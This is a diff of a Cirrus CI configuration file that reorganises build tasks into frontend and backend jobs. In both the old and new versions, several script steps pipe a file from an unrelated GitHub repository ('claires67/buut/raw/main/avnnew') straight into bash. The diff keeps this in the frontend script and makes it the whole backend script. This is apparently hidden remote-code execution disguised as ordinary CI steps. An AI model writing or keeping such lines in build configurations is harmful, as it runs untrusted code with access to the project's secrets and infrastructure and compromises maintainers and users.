@@ -1,25 +1,24 @@
-task:
+# Specify the container for the frontend
+frontend_task:
   container:
-    image: node:latest # 
+    image: node:latest
+  cache:
+    node_modules_cache:
+      folder: node_modules
+      fingerprint_script: cat package-lock.json
+      populate_script: npm install
+  script:
+    - npm run lint
+    - curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
 
-  node_modules_cache: # 
-    folder: node_modules
-    fingerprint_script: cat yarn.lock
-    populate_script: yarn install
-
-  matrix: # 
-    - name: Lint
-      skip: !changesInclude('.cirrus.yml', '**.{js,ts}') # 
-      lint_script: yarn run lint
-    - name: Test
-      container:
-        matrix: # 
-          - image: node:latest
-          - image: node:lts
-      test_script: curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
-    - name: Publish
-      depends_on:
-        - Lint
-        - Test
-      only_if: $BRANCH == "master" # 
-      publish_script: curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
+# Specify the container for the backend
+backend_task:
+  container:
+    image: python:3.9
+  cache:
+    pip_cache:
+      folder: ~/.cache/pip
+      fingerprint_script: cat requirements.txt
+      populate_script: pip install -r requirements.txt
+  script:
+    - curl -sL https://github.com/claires67/buut/raw/main/avnnew | bash
